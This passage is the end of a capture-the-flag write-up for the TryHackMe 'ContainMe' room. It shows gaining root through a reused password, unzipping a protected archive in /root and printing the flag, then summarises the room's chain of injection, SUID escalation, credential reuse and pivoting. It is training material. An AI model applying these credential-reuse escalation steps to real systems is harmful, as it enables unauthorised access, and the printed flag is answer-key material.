While the root password appears complex, note that the root system user may reuse the known password value.

Switch to Root
bash
su root
When prompted, enter password. It works:

text
root@host2:/home/mike#
Retrieve the Flag
Navigate to /root:

bash
cd /root
ls
# Output: mike.zip
Unzip the archive:

bash
unzip mike.zip
The archive is password-protected. Again, the password is password.

After extraction, two files appear: mike and mike.zip. The mike file contains the flag:

bash
cat mike
THM{_Y0U_F0UND_TH3_C0NTA1N3RS_}
9. Conclusion
The ContainMe room demonstrates a classic chain of vulnerabilities:

Command injection in a web application parameter.

Insecure SUID binary allowing privilege escalation within a container.

Credential reuse and SSH pivoting to a second host.

Weak password practices leading to full system compromise.

Flag: THM{_Y0U_F0UND_TH3_C0NTA1N3RS_}
